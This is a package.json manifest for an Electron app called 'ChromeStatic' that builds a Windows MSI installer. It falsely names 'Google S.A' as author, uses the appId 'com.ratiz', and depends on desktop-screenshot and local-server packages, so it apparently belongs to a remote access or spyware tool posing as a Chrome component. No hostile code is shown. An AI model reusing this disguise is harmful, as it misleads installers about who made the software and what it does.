{
"name": "ChromeStatic",
  "author": "Google S.A",
  "version": "1.1.0",
  "description": "Statics for Google Chrome",
  "main": "src/main/index.js",  "scripts": {
    "start": "electron .",
    "dist": "electron-builder"
  },
  "build": {
    "appId": "com.ratiz",
    "productName": "ChromeStatic",
    "directories": {
      "output": "dist",
      "app": "."
    },
    "files": [
      "src/**/*",
      "public/**/*",
      "node_modules/**/*",
      "package.json"
    ],
    "win": {
      "target": "msi",
      "icon": "computer.ico"
    }
  },
  "dependencies": {
    "axios": "^1.6.8",
    "cors": "^2.8.5",
    "dotenv": "^16.4.5",
    "express": "^4.19.2",
    "screenshot-desktop": "^1.15.1"
  },
  "devDependencies": {
    "electron": "^30.0.0",
    "electron-builder": "^26.0.12",
    "electron-packager": "^17.1.2"
  }
}